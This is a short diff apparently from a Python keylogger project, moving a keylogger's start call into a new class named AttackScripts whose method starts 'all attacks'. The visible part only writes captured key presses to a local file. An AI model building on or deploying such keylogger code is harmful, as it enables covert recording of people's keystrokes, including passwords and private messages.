@@ -17,6 +17,11 @@ class Keylogger():
         self.f.write(button)
         self.f.flush()
 
-Keylogger_object=Keylogger("keylogger.txt")
-Keylogger_object.start_log()
+class AttackScripts():
+    def __init__(self):
+        self.Keylogger=Keylogger("keylogger.txt")
+    def start_all_attacks(self):
+        self.Keylogger.start_log()
+
+
 
